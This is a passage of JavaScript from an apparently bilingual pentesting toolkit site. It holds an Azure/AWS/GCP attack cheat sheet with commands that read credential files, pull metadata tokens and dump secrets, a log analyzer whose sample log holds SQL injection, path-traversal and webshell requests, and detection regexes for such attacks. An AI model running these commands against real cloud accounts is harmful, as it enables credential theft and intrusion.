                        {desc: lang==='es'?'Ver IPs públicas':'View public IPs', cmd: 'az network public-ip list --query "[].{Name:name, IP:ipAddress, DNS:dnsSettings.fqdn}" -o table'},
                        {desc: lang==='es'?'Listar Storage Accounts':'List Storage Accounts', cmd: 'az storage account list --query "[].{Name:name, RG:resourceGroup, Public:allowBlobPublicAccess}" -o table'},
                        {desc: lang==='es'?'Listar contenedores de Storage (blobs públicos)':'List Storage containers (public blobs)', cmd: 'az storage container list --account-name STORAGE_NAME --query "[].{Name:name, Public:properties.publicAccess}" -o table'},
                        {desc: lang==='es'?'Ver Key Vaults':'View Key Vaults', cmd: 'az keyvault list --query "[].{Name:name, RG:resourceGroup, Enabled:properties.enableSoftDelete}" -o table'},
                        {desc: lang==='es'?'Ver secretos de un Key Vault':'View Key Vault secrets', cmd: 'az keyvault secret list --vault-name VAULT_NAME -o table'}
                    ],
                    'Herramientas': [
                        {desc: lang==='es'?'ROADtools — recopilar y visualizar AAD':'ROADtools — collect and visualise AAD', cmd: 'pip3 install roadtools\nroadrecon gather -u user@{TARGET} -p Password123\nroadrecon gui'},
                        {desc: lang==='es'?'BloodHound para Azure (AzureHound)':'BloodHound for Azure (AzureHound)', cmd: './azurehound -u user@{TARGET} -p "Password123" list -o output.json\n# Importar en BloodHound Community Edition'},
                        {desc: lang==='es'?'ScoutSuite — auditoría multicloud':'ScoutSuite — multi-cloud audit', cmd: 'pip3 install scoutsuite\npython3 -m scout azure --cli'},
                        {desc: lang==='es'?'PowerZure — post-explotación Azure':'PowerZure — Azure post-exploitation', cmd: 'Import-Module PowerZure\nGet-AzureRunAs'}
                    ]
                }
            },
            aws: {
                target_label: lang==='es' ? 'Cuenta / perfil AWS' : 'AWS Account / Profile',
                placeholder: '123456789012',
                sections: {
                    'Reconocimiento': [
                        {desc: lang==='es'?'Verificar identidad actual':'Check current identity', cmd: 'aws sts get-caller-identity'},
                        {desc: lang==='es'?'Enumerar cuentas/perfiles locales':'Enumerate local accounts/profiles', cmd: 'cat ~/.aws/credentials\ncat ~/.aws/config'},
                        {desc: lang==='es'?'Buscar buckets S3 por nombre':'Find S3 buckets by name', cmd: 'for word in backup data files media static; do aws s3 ls s3://{TARGET}-${word} 2>/dev/null && echo "FOUND: {TARGET}-${word}"; done'},
                        {desc: lang==='es'?'Listar buckets S3 accesibles':'List accessible S3 buckets', cmd: 'aws s3 ls'},
                        {desc: lang==='es'?'Ver contenido de un bucket S3 público':'View public S3 bucket contents', cmd: 'aws s3 ls s3://BUCKET_NAME --no-sign-request'},
                        {desc: lang==='es'?'Metadata del servidor (SSRF/desde EC2)':'Instance metadata (SSRF/from EC2)', cmd: 'curl http://169.254.169.254/latest/meta-data/\ncurl http://169.254.169.254/latest/meta-data/iam/security-credentials/'}
                    ],
                    'IAM': [
                        {desc: lang==='es'?'Listar usuarios IAM':'List IAM users', cmd: 'aws iam list-users --query "Users[*].{User:UserName, Created:CreateDate}" -o table'},
                        {desc: lang==='es'?'Listar grupos IAM':'List IAM groups', cmd: 'aws iam list-groups'},
                        {desc: lang==='es'?'Listar políticas adjuntas a usuario':'List policies attached to user', cmd: 'aws iam list-attached-user-policies --user-name USERNAME'},
                        {desc: lang==='es'?'Ver políticas inline de usuario':'View user inline policies', cmd: 'aws iam list-user-policies --user-name USERNAME'},
                        {desc: lang==='es'?'Simular permisos (qué puede hacer la cuenta)':'Simulate permissions (what the account can do)', cmd: 'aws iam simulate-principal-policy --policy-source-arn arn:aws:iam::ACCOUNT:user/USERNAME --action-names "s3:*" "ec2:*" "iam:*"' },
                        {desc: lang==='es'?'Enumerar roles asumibles':'Enumerate assumable roles', cmd: 'aws iam list-roles --query "Roles[*].{Role:RoleName, ARN:Arn}" -o table'},
                        {desc: lang==='es'?'Asumir un rol':'Assume a role', cmd: 'aws sts assume-role --role-arn arn:aws:iam::ACCOUNT:role/ROLE --role-session-name pentest'}
                    ],
                    'Servicios': [
                        {desc: lang==='es'?'Listar instancias EC2':'List EC2 instances', cmd: 'aws ec2 describe-instances --query "Reservations[*].Instances[*].{ID:InstanceId, IP:PublicIpAddress, PrivIP:PrivateIpAddress, State:State.Name}" -o table'},
                        {desc: lang==='es'?'Listar Security Groups':'List Security Groups', cmd: 'aws ec2 describe-security-groups --query "SecurityGroups[*].{Name:GroupName, ID:GroupId}" -o table'},
                        {desc: lang==='es'?'Buscar security groups con 0.0.0.0/0':'Find security groups open to 0.0.0.0/0', cmd: 'aws ec2 describe-security-groups --query "SecurityGroups[?IpPermissions[?IpRanges[?CidrIp==\`0.0.0.0/0\`]]].{Name:GroupName, ID:GroupId}" -o table'},
                        {desc: lang==='es'?'Listar funciones Lambda':'List Lambda functions', cmd: 'aws lambda list-functions --query "Functions[*].{Name:FunctionName, Runtime:Runtime, Role:Role}" -o table'},
                        {desc: lang==='es'?'Listar secretos en Secrets Manager':'List Secrets Manager secrets', cmd: 'aws secretsmanager list-secrets --query "SecretList[*].{Name:Name, ARN:ARN}" -o table'},
                        {desc: lang==='es'?'Ver valor de un secreto':'Get secret value', cmd: 'aws secretsmanager get-secret-value --secret-id SECRET_NAME'},
                        {desc: lang==='es'?'Listar parámetros SSM':'List SSM parameters', cmd: 'aws ssm describe-parameters --query "Parameters[*].{Name:Name, Type:Type}" -o table'},
                        {desc: lang==='es'?'Leer parámetro SSM (con decifrado)':'Read SSM parameter (with decryption)', cmd: 'aws ssm get-parameter --name /production/database/password --with-decryption'}
                    ],
                    'Herramientas': [
                        {desc: lang==='es'?'Pacu — framework de post-explotación AWS':'Pacu — AWS post-exploitation framework', cmd: 'pip3 install pacu\npacu\n# Dentro de Pacu:\nset_keys\nrun iam__enum_users_roles_policies_groups'},
                        {desc: lang==='es'?'ScoutSuite — auditoría AWS':'ScoutSuite — AWS audit', cmd: 'python3 -m scout aws --profile default'},
                        {desc: lang==='es'?'Prowler — CIS benchmark AWS':'Prowler — CIS benchmark AWS', cmd: 'pip3 install prowler\nprowler aws -M csv json -f eu-west-1'},
                        {desc: lang==='es'?'CloudMapper — visualización de red AWS':'CloudMapper — AWS network visualisation', cmd: 'python3 cloudmapper.py collect --account {TARGET}\npython3 cloudmapper.py report --account {TARGET}'}
                    ]
                }
            },
            gcp: {
                target_label: lang==='es' ? 'Proyecto GCP (project-id)' : 'GCP Project (project-id)',
                placeholder: 'my-project-123456',
                sections: {
                    'Reconocimiento': [
                        {desc: lang==='es'?'Ver cuenta activa':'View active account', cmd: 'gcloud auth list\ngcloud config list'},
                        {desc: lang==='es'?'Listar proyectos accesibles':'List accessible projects', cmd: 'gcloud projects list'},
                        {desc: lang==='es'?'Metadata del servidor (SSRF/desde GCE)':'Instance metadata (SSRF/from GCE)', cmd: 'curl "http://metadata.google.internal/computeMetadata/v1/?recursive=true" -H "Metadata-Flavor: Google"'},
                        {desc: lang==='es'?'Obtener token de acceso desde metadata':'Get access token from metadata', cmd: 'curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" -H "Metadata-Flavor: Google"'},
                        {desc: lang==='es'?'Buscar buckets GCS públicos':'Find public GCS buckets', cmd: 'for word in backup data files media static; do gsutil ls gs://{TARGET}-${word} 2>/dev/null && echo "FOUND"; done'}
                    ],
                    'IAM': [
                        {desc: lang==='es'?'Ver política IAM del proyecto':'View project IAM policy', cmd: 'gcloud projects get-iam-policy {TARGET} --format json'},
                        {desc: lang==='es'?'Listar cuentas de servicio':'List service accounts', cmd: 'gcloud iam service-accounts list --project={TARGET}'},
                        {desc: lang==='es'?'Ver claves de cuenta de servicio':'View service account keys', cmd: 'gcloud iam service-accounts keys list --iam-account SA_EMAIL'},
                        {desc: lang==='es'?'Listar roles personalizados':'List custom roles', cmd: 'gcloud iam roles list --project={TARGET}'},
                        {desc: lang==='es'?'Ver permisos de un rol':'View role permissions', cmd: 'gcloud iam roles describe roles/editor'}
                    ],
                    'Servicios': [
                        {desc: lang==='es'?'Listar instancias Compute Engine':'List Compute Engine instances', cmd: 'gcloud compute instances list --project={TARGET}'},
                        {desc: lang==='es'?'Listar buckets Cloud Storage':'List Cloud Storage buckets', cmd: 'gsutil ls -p {TARGET}'},
                        {desc: lang==='es'?'Ver ACL de un bucket':'View bucket ACL', cmd: 'gsutil acl get gs://BUCKET_NAME'},
                        {desc: lang==='es'?'Listar secretos de Secret Manager':'List Secret Manager secrets', cmd: 'gcloud secrets list --project={TARGET}'},
                        {desc: lang==='es'?'Leer valor de un secreto':'Read a secret value', cmd: 'gcloud secrets versions access latest --secret=SECRET_NAME --project={TARGET}'},
                        {desc: lang==='es'?'Listar funciones Cloud Functions':'List Cloud Functions', cmd: 'gcloud functions list --project={TARGET}'},
                        {desc: lang==='es'?'Listar endpoints Cloud Run':'List Cloud Run endpoints', cmd: 'gcloud run services list --project={TARGET}'}
                    ],
                    'Herramientas': [
                        {desc: lang==='es'?'GCPBucketBrute — enumerar buckets GCS':'GCPBucketBrute — enumerate GCS buckets', cmd: 'python3 GCPBucketBrute.py -k {TARGET} -w wordlist.txt'},
                        {desc: lang==='es'?'ScoutSuite — auditoría GCP':'ScoutSuite — GCP audit', cmd: 'python3 -m scout gcp --project {TARGET}'},
                        {desc: lang==='es'?'GCP IAM Privilege Escalation (PayloadsAllTheThings)':'GCP IAM Privilege Escalation', cmd: '# Ver: https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation'}
                    ]
                }
            }
        };

        function escapeHTML(s) {
            const d = document.createElement('div');
            d.textContent = String(s || '');
            return d.innerHTML;
        }

        function renderCmds() {
            const targetVal = cloudTargetInput.value.trim() || 'TARGET';
            const sectionsData = DATA[currentCloud].sections;
            let html = '';

            for (const [sectionName, items] of Object.entries(sectionsData)) {
                if (activeSection !== 'all' && sectionName !== activeSection) continue;

                html += `<div class="cloud-sec-header">${escapeHTML(sectionName)}</div>`;
                
                items.forEach(item => {
                    const finalCmd = item.cmd.replace(/\{TARGET\}/g, targetVal);
                    html += `
                    <div class="cloud-cmd-item">
                        <div class="cloud-cmd-desc">${escapeHTML(item.desc)}</div>
                        <div class="cloud-cmd-box">
                            <pre class="cloud-cmd-pre">${escapeHTML(finalCmd)}</pre>
                            <button type="button" class="copy-btn-mini" data-copy="${escapeHTML(finalCmd)}" style="position:absolute; top:0.5rem; right:0.5rem;">📋</button>
                        </div>
                    </div>`;
                });
            }

            cloudCmdsContainer.innerHTML = html || `<p style="color:var(--gray); font-family:var(--mono);">Sin comandos.</p>`;

            // Configurar botones de copia
            document.querySelectorAll('#cloud-cmds .copy-btn-mini').forEach(b => {
                b.addEventListener('click', function() {
                    if (typeof window.copyToClipboard === 'function') {
                        window.copyToClipboard(this.dataset.copy, this);
                    } else {
                        navigator.clipboard.writeText(this.dataset.copy);
                    }
                    this.textContent = '✅';
                    setTimeout(() => this.textContent = '📋', 1500);
                });
            });
        }

        function renderPills() {
            const sections = Object.keys(DATA[currentCloud].sections);
            let html = `<button type="button" data-sec="all" class="sec-pill ${activeSection === 'all' ? 'active' : ''}">All</button>`;
            
            sections.forEach(s => {
                html += `<button type="button" data-sec="${escapeHTML(s)}" class="sec-pill ${activeSection === s ? 'active' : ''}">${escapeHTML(s)}</button>`;
            });
            
            sectionPillsContainer.innerHTML = html;

            // Añadir eventos a las nuevas pills
            document.querySelectorAll('.sec-pill').forEach(btn => {
                btn.addEventListener('click', function() {
                    activeSection = this.dataset.sec;
                    document.querySelectorAll('.sec-pill').forEach(b => b.classList.remove('active'));
                    this.classList.add('active');
                    renderCmds();
                });
            });
        }

        function setCloud(cloud) {
            currentCloud = cloud;
            activeSection = 'all';

            // Actualizar botones de pestañas
            cloudTabs.forEach(btn => {
                if (btn.dataset.cloud === cloud) {
                    btn.classList.add('active');
                } else {
                    btn.classList.remove('active');
                }
            });

            // Actualizar inputs y labels
            const d = DATA[cloud];
            targetLabel.textContent = d.target_label;
            cloudTargetInput.placeholder = d.placeholder;
            
            // Forzar recálculo para reemplazar el {TARGET} por defecto si el input está vacío
            cloudTargetInput.value = ''; 

            renderPills();
            renderCmds();
        }

        // Eventos principales
        cloudTabs.forEach(btn => {
            btn.addEventListener('click', function() {
                setCloud(this.dataset.cloud);
            });
        });

        cloudTargetInput.addEventListener('input', renderCmds);

        // Inicializar
        setCloud('azure');

    })();
    // =========================================================
    // 24. Herramienta: Security Log Analyzer
    // =========================================================
    (function() {
        const logInput = document.getElementById('log-input');
        if (!logInput) return;

        console.log("✅ Security Log Analyzer cargado.");

        const btnAnalyze = document.getElementById('btn-log-analyze');
        const btnExample = document.getElementById('btn-log-example');
        const logStats = document.getElementById('log-stats');
        const logResults = document.getElementById('log-results');
        const typeBtns = document.querySelectorAll('.log-type-btn');
        const lang = window.LANG || 'es';

        let currentType = 'auto';

        const EXAMPLE_LOG = 
`192.168.1.100 - admin [29/Apr/2026:10:22:00 +0000] "GET /index.php HTTP/1.1" 200 4523
192.168.1.100 - - [29/Apr/2026:10:22:01 +0000] "GET /index.php?id=1' OR '1'='1 HTTP/1.1" 200 4523 "-" "sqlmap/1.7.8"
10.0.0.5 - - [29/Apr/2026:10:22:02 +0000] "GET /../../etc/passwd HTTP/1.1" 404 217 "-" "Nikto/2.1.6"
45.33.32.156 - - [29/Apr/2026:10:22:03 +0000] "POST /wp-login.php HTTP/1.1" 200 2718 "-" "python-requests"
45.33.32.156 - - [29/Apr/2026:10:22:04 +0000] "POST /wp-login.php HTTP/1.1" 200 2718 "-" "python-requests"
45.33.32.156 - - [29/Apr/2026:10:22:05 +0000] "POST /wp-login.php HTTP/1.1" 200 2718 "-" "python-requests"
203.0.113.42 - - [29/Apr/2026:10:22:06 +0000] "GET /admin/config.php.bak HTTP/1.1" 200 1024 "-" "curl/7.74"
198.51.100.5 - - [29/Apr/2026:10:22:07 +0000] "GET /?s=<script>alert(1)</script> HTTP/1.1" 200 3219
10.10.14.5  - - [29/Apr/2026:10:22:08 +0000] "GET /shell.php?cmd=id HTTP/1.1" 200 1024
209.85.128.0 - - [29/Apr/2026:10:22:09 +0000] "GET /robots.txt HTTP/1.1" 200 65 "-" "Googlebot/2.1"`;

        const PATTERNS = [
            { id: 'sqli', severity: 'critical', label: 'SQL Injection', color: '#ff5050', regex: /union.{0,20}select|select.{0,30}from|insert.{0,20}into|drop.{0,10}table|'.*or.*'.*=.*'|1=1|1%3D1|%27.*or|xp_cmdshell/i },
            { id: 'xss', severity: 'high', label: 'XSS', color: '#ff8040', regex: /<script|javascript:|onerror=|onload=|alert\(|%3Cscript|%3c%73%63%72%69%70%74|\bon\w+\s*=/i },
            { id: 'lfi', severity: 'high', label: 'LFI / Path Traversal', color: '#ff8040', regex: /\.\.\/|\.\.\\|%2e%2e%2f|%252e%252e%252f|\/etc\/passwd|\/etc\/shadow|boot\.ini|win\.ini/i },
            { id: 'rce', severity: 'critical', label: 'Remote Code Execution', color: '#ff5050', regex: /cmd=|shell=|exec=|system\(|passthru\(|eval\(|base64_decode|\/bin\/bash|\/bin\/sh|cmd\.exe|powershell/i },
            { id: 'ssrf', severity: 'high', label: 'SSRF', color: '#ff8040', regex: /169\.254\.169\.254|metadata\.google|localhost|127\.0\.0\.1|192\.168\.|10\.\d+\.\d+\.\d+|file:\/\/|dict:\/\//i },
            { id: 'bruteforce', severity: 'medium', label: lang === 'es' ? 'Brute Force / Spam' : 'Brute Force / Spam', color: '#f0c000', regex: /wp-login|xmlrpc|admin\/login|login\.php|signin/i },
            { id: 'scanner', severity: 'medium', label: lang === 'es' ? 'Escáner / Tool' : 'Scanner / Tool', color: '#f0c000', regex: /sqlmap|nikto|nmap|masscan|nuclei|acunetix|burpsuite|wfuzz|dirb|dirbuster|gobuster|nessus|openvas|zgrab|python-requests\/|curl\//i },
            { id: 'backup', severity: 'high', label: lang === 'es' ? 'Archivos sensibles' : 'Sensitive files', color: '#ff8040', regex: /\.bak|\.old|\.backup|\.sql|\.env|config\.php|\.git\/|\.svn\/|\.DS_Store|web\.config|\.htpasswd/i },
            { id: 'xxe', severity: 'high', label: 'XXE', color: '#ff8040', regex: /<!ENTITY|SYSTEM\s+["']|DOCTYPE.*ENTITY/i },
            { id: 'ssti', severity: 'high', label: 'SSTI', color: '#ff8040', regex: /\{\{.*\}\}|\$\{.*\}|<%=.*%>/ }
        ];

        function escapeHTML(s) {
            const d = document.createElement('div');
            d.textContent = String(s || '');
            return d.innerHTML;
        }

        function extractIP(line) {
            const m = line.match(/^(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/);
            return m ? m[1] : null;
        }

        // Selección de tipo de log
        typeBtns.forEach(btn => {
            btn.addEventListener('click', function() {
                typeBtns.forEach(b => b.classList.remove('active'));
                this.classList.add('active');
                currentType = this.dataset.ltype;
            });
        });

        btnExample.addEventListener('click', () => {
            logInput.value = EXAMPLE_LOG;
        });

        btnAnalyze.addEventListener('click', () => {
            const raw = logInput.value.trim();
            if (!raw) return;

            const lines = raw.split('\n').filter(Boolean);
            logStats.textContent = `${lines.length} ${lang === 'es' ? 'líneas totales procesadas' : 'total lines processed'}`;

            const findings = {};
            const ipCounts = {};
            const statusCounts = {};

            PATTERNS.forEach(p => findings[p.id] = []);

            // Procesamiento de líneas
            lines.forEach((line, idx) => {
                const ip = extractIP(line);
                if (ip) ipCounts[ip] = (ipCounts[ip] || 0) + 1;

                const statusM = line.match(/" (\d{3}) /);
                if (statusM) statusCounts[statusM[1]] = (statusCounts[statusM[1]] || 0) + 1;

                PATTERNS.forEach(p => {
                    if (p.regex.test(line)) {
                        findings[p.id].push({ line: idx + 1, text: line.slice(0, 250), ip: ip });
                    }
                });
            });

            // Generación de HTML
            let html = '';
            let totalFindings = 0;
            let critCount = 0, highCount = 0, medCount = 0;

            PATTERNS.forEach(p => {
                const n = findings[p.id].length;
                totalFindings += n;
                if (n) {
                    if (p.severity === 'critical') critCount += n;
                    else if (p.severity === 'high') highCount += n;
                    else medCount += n;
                }
            });

            // Dashboard
            html += `<div class="log-stat-grid">`;
            html += `<div class="log-stat-card crit"><div class="num">${critCount}</div><div class="label">${lang === 'es' ? 'CRÍTICO' : 'CRITICAL'}</div></div>`;
            html += `<div class="log-stat-card high"><div class="num">${highCount}</div><div class="label">${lang === 'es' ? 'ALTO' : 'HIGH'}</div></div>`;
            html += `<div class="log-stat-card med"><div class="num">${medCount}</div><div class="label">${lang === 'es' ? 'MEDIO' : 'MEDIUM'}</div></div>`;

            // Top IPs
            const topIPs = Object.entries(ipCounts).sort((a, b) => b[1] - a[1]).slice(0, 5);
            if (topIPs.length) {
                html += `
                <div class="log-top-ips">
                    <div class="info-card-label" style="margin-bottom:0.8rem; color:var(--cyan);">${lang === 'es' ? 'Top IPs Atacantes / Origen' : 'Top Source IPs'}</div>`;
                topIPs.forEach(e => {
                    html += `<div class="log-top-ip-row"><span style="color:var(--white);">${escapeHTML(e[0])}</span><span style="color:var(--gray);">${e[1]} req</span></div>`;
                });
                html += `</div>`;
            }
            html += `</div>`; // Fin Dashboard

            // Detalles de los hallazgos
            PATTERNS.forEach(p => {
                const items = findings[p.id];
                if (!items.length) return;

                html += `<div class="m-bottom-1-5">
                    <div class="log-finding-header">
                        <span class="log-finding-dot" style="color:${p.color}; background:${p.color};"></span>
                        <strong style="font-family:var(--mono); font-size:1rem; color:var(--white);">${p.label}</strong>
                        <span style="font-family:var(--mono); font-size:0.85rem; font-weight:600; color:${p.color}; margin-left:auto;">${items.length} ${lang === 'es' ? 'hits' : 'hits'}</span>
                    </div>`;

                items.slice(0, 10).forEach(item => {
                    html += `
                    <div class="log-finding-row">
                        <span class="log-line-num">#${item.line}</span>
                        <div class="log-line-text">${escapeHTML(item.text)}</div>
                    </div>`;
                });

                if (items.length > 10) {
                    html += `<p style="font-family:var(--mono); font-size:0.8rem; color:var(--cyan); margin:0.5rem 0 0 2.5rem;">... ${lang === 'es' ? 'y' : 'and'} ${items.length - 10} ${lang === 'es' ? 'más' : 'more'}</p>`;
                }
                html += `</div>`;
            });

            if (!totalFindings) {
                html = `<div class="md-error-msg" style="color:#00d45a;">✅ ${lang === 'es' ? 'No se detectaron patrones de ataque conocidos en la muestra.' : 'No known attack patterns detected in the sample.'}</div>`;
            }

            logResults.innerHTML = html;
        });

    })();
   // =========================================================
    // 25. Herramienta: CVE & Exploit Finder Integrado
    // =========================================================
    (function() {
        const cveInput = document.getElementById('cve-input');
        if (!cveInput) return;

        console.log("✅ CVE & Exploit Finder cargado.");

        const btnSearch = document.getElementById('btn-cve-search');
        const cveStatus = document.getElementById('cve-status');
        const cveResults = document.getElementById('cve-results');
        const lang = window.LANG || 'es';

        function escapeHTML(s) {
            const d = document.createElement('div');
            d.textContent = String(s || '');
            return d.innerHTML;
        }

        // Determinar el color y etiqueta según el CVSS v3 Score
        function getSeverityBadge(score) {
            if (!score && score !== 0) return `<span class="cvss-badge cvss-none">N/A</span>`;
            const s = parseFloat(score);
            if (s >= 9.0) return `<span class="cvss-badge cvss-crit">CRÍTICO (${s})</span>`;
            if (s >= 7.0) return `<span class="cvss-badge cvss-high">ALTO (${s})</span>`;
            if (s >= 4.0) return `<span class="cvss-badge cvss-med">MEDIO (${s})</span>`;
            return `<span class="cvss-badge cvss-low">BAJO (${s})</span>`;
        }

        async function searchCVEs(isInitialLoad = false) {
            const query = cveInput.value.trim();
            if (!query && !isInitialLoad) return;

            // Limpiamos la pantalla y mostramos el "Cargando..."
            cveResults.innerHTML = '';
            cveStatus.innerHTML = `<span style="color:var(--cyan);">⏳ ${lang === 'es' ? 'Consultando base de datos...' : 'Querying database...'}</span>`;
            btnSearch.disabled = true;

            // Límite de tiempo (15 seg) para evitar que se quede colgado
            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), 15000);

            try {
                // Hacemos la petición a NUESTRO proxy PHP local o al archivo de Caché
                let url = `?api_cve=${encodeURIComponent(query)}`;
                if (isInitialLoad && !query) {
                    url = `/assets/data/cve-cache.json?v=${new Date().getTime()}`;
                }
                
                let response = await fetch(url, { signal: controller.signal });
                
                // Si falla el archivo JSON en carga inicial, usamos un endpoint por defecto
                if (isInitialLoad && !response.ok) {
                    url = `?api_cve=latest`;
                    response = await fetch(url, { signal: controller.signal });
                }
                
                clearTimeout(timeoutId);

                if (!response.ok) {
                    // Intentar leer el error enviado por PHP
                    const errData = await response.json().catch(() => ({}));
                    throw new Error(errData.error || `HTTP Error: ${response.status}`);
                }

                // Prevenimos fallos si PHP devuelve HTML en lugar de JSON (ej: un Warning del servidor)
                const responseText = await response.text();
                let data;
                try {
                    data = JSON.parse(responseText);
                } catch (e) {
                    throw new Error(lang === 'es' ? 'El servidor no devolvió un JSON válido. Comprueba la caché o el proxy PHP.' : 'Server did not return valid JSON.');
                }
                
                // Soportar tanto formato NVD como arrays planos cacheados por sync-cves.php
                const vulns = data.vulnerabilities || (Array.isArray(data) ? data : []);

                if (vulns.length === 0) {
                    if (isInitialLoad) {
                        cveStatus.innerHTML = `<span style="color:var(--gray-dark);">⏳ ${lang === 'es' ? 'Base de datos conectada. Esperando búsqueda...' : 'Database connected. Waiting for search...'}</span>`;
                    } else {
                        cveStatus.innerHTML = `<span style="color:#00d45a;">✅ ${lang === 'es' ? 'No se encontraron vulnerabilidades para:' : 'No vulnerabilities found for:'} "${escapeHTML(query)}"</span>`;
                    }
                    btnSearch.disabled = false;
                    return;
                }

                if (isInitialLoad && !query) {
                    cveStatus.innerHTML = `✅ ${lang === 'es' ? 'Base de datos sincronizada. Mostrando los últimos registros.' : 'Database synced. Showing recent records.'}`;
                } else {
                    cveStatus.innerHTML = `${lang === 'es' ? 'Mostrando los últimos' : 'Showing the latest'} ${vulns.length} ${lang === 'es' ? 'resultados para' : 'results for'}: "${escapeHTML(query)}"`;
                }

                let html = '';
                vulns.forEach(item => {
                    const cve = item.cve || item;
                    const cveId = cve.id || cve.cveId || cve.idCVE || cve.CVE || "CVE-UNKNOWN";
                    
                    // Extraer descripción tolerando distintos formatos
                    let desc = "No description available.";
                    if (cve.descriptions && cve.descriptions.length > 0) {
                        const enDesc = cve.descriptions.find(d => d.lang === 'en');
                        desc = enDesc ? enDesc.value : cve.descriptions[0].value;
                    } else if (cve.description || cve.desc) {
                        desc = cve.description || cve.desc;
                    } else if (cve.bugzilla_description) {
                        desc = cve.bugzilla_description;
                    }

                    let cvssScore = null;
                    if (cve.metrics) {
                        if (cve.metrics.cvssMetricV31) cvssScore = cve.metrics.cvssMetricV31[0].cvssData.baseScore;
                        else if (cve.metrics.cvssMetricV30) cvssScore = cve.metrics.cvssMetricV30[0].cvssData.baseScore;
                        else if (cve.metrics.cvssMetricV2) cvssScore = cve.metrics.cvssMetricV2[0].cvssData.baseScore;
                    } else if (cve.cvss !== undefined || cve.cvssScore !== undefined) {
                        cvssScore = cve.cvssScore || cve.cvss;
                    } else if (cve.cvss3_score !== undefined || cve.cvss_score !== undefined) {
                        cvssScore = cve.cvss3_score || cve.cvss_score;
                    }

                    const exploitDbId = cveId ? cveId.replace('CVE-', '') : '';

                    html += `
                    <div class="cve-card">
                        <div class="cve-header">
                            <div class="cve-title">${escapeHTML(cveId)}</div>
                            ${getSeverityBadge(cvssScore)}
                        </div>
                        <div class="cve-desc">${escapeHTML(desc)}</div>
                        <div class="cve-actions">
                            <a href="https://nvd.nist.gov/vuln/detail/${cveId}" target="_blank" class="cve-action-btn">
                                🏛️ NIST Details
                            </a>
                            <a href="https://github.com/search?q=${cveId}+poc&type=repositories" target="_blank" class="cve-action-btn" style="border-color: rgba(0, 255, 255, 0.3);">
                                <svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><path d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z"/></svg>
                                GitHub PoC
                            </a>
                            <a href="https://www.exploit-db.com/search?cve=${exploitDbId}" target="_blank" class="cve-action-btn">
                                🎯 Exploit-DB
                            </a>
                        </div>
                    </div>`;
                });

                cveResults.innerHTML = html;

            } catch (error) {
                if (isInitialLoad && !query) {
                    cveStatus.innerHTML = `<span style="color:#f0a000;">⚠️ ${lang === 'es' ? 'Esperando búsqueda manual...' : 'Waiting for manual search...'}</span>`;
                } else if (error.name === 'AbortError') {
                    cveStatus.innerHTML = `<span style="color:#ff5050;">❌ ${lang === 'es' ? 'Tiempo de espera agotado.' : 'Timeout.'}</span>`;
                } else {
                    cveStatus.innerHTML = `<span style="color:#ff5050;">❌ ${escapeHTML(error.message)}</span>`;
                }
            } finally {
                btnSearch.disabled = false;
            }
        }

        btnSearch.addEventListener('click', () => searchCVEs(false));
        cveInput.addEventListener('keydown', (e) => {
            if (e.key === 'Enter') searchCVEs(false);
        });

        // 🚀 EJECUCIÓN AUTOMÁTICA AL CARGAR LA HERRAMIENTA 🚀
        searchCVEs(true);

    })();
    // =========================================================
    // 26. Herramienta: Subdomain Takeover Assistant
    // =========================================================
    (function() {
        const tkInput = document.getElementById('takeover-input');
        if (!tkInput) return;

        console.log("✅ Subdomain Takeover Assistant cargado.");

        const btnScan = document.getElementById('btn-takeover-scan');
        const btnExample = document.getElementById('btn-takeover-example');
        const tkStatus = document.getElementById('takeover-status');
        const tkResults = document.getElementById('takeover-results');
        const lang = window.LANG || 'es';

        function escapeHTML(s) {
            const d = document.createElement('div');
            d.textContent = String(s || '');
            return d.innerHTML;
        }

        // Cargar datos de prueba
        btnExample.addEventListener('click', () => {
            tkInput.value = [
                "www.google.com",
                "nonexistent-subdomain.github.io",
                "blog.ejemplo-vulnerable.com", 
                "api.ejemplo.com"
            ].join('\n');
            tkResults.innerHTML = '';
            tkStatus.innerHTML = lang === 'es' ? '💡 Ejemplo cargado. (Nota: Para ver un Takeover real, necesitarías un subdominio que apunte a un CNAME vulnerable).' : '💡 Example loaded.';
        });

        btnScan.addEventListener('click', async () => {
            const lines = tkInput.value.split('\n').map(l => l.trim()).filter(l => l.length > 0);
            if (lines.length === 0) return;

            if (lines.length > 50) {
                alert(lang === 'es' ? 'Por favor, analiza un máximo de 50 subdominios a la vez para no saturar el DNS.' : 'Please scan a maximum of 50 subdomains at once.');
                return;
            }

            tkResults.innerHTML = '';
            tkStatus.innerHTML = `<span style="color:var(--cyan);">⏳ ${lang === 'es' ? 'Resolviendo registros DNS y analizando firmas (' + lines.length + ' dominios)...' : 'Resolving DNS and analyzing signatures...'}</span>`;
            btnScan.disabled = true;

            try {
                // Enviamos los dominios al backend PHP para que haga la consulta DNS
                const response = await fetch('?api=1', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ domains: lines })
                });

                if (!response.ok) throw new Error('HTTP Error: ' + response.status);
                
                const data = await response.json();
                let html = '';
                let vulnerablesCount = 0;

                data.forEach(item => {
                    if (item.error) {
                        html += `
                        <div class="tk-card">
                            <div class="tk-header">
                                <span class="tk-domain">${escapeHTML(item.domain)}</span>
                                <span class="tk-badge none">Inválido</span>
                            </div>
                        </div>`;
                        return;
                    }

                    if (item.vulnerable) vulnerablesCount++;

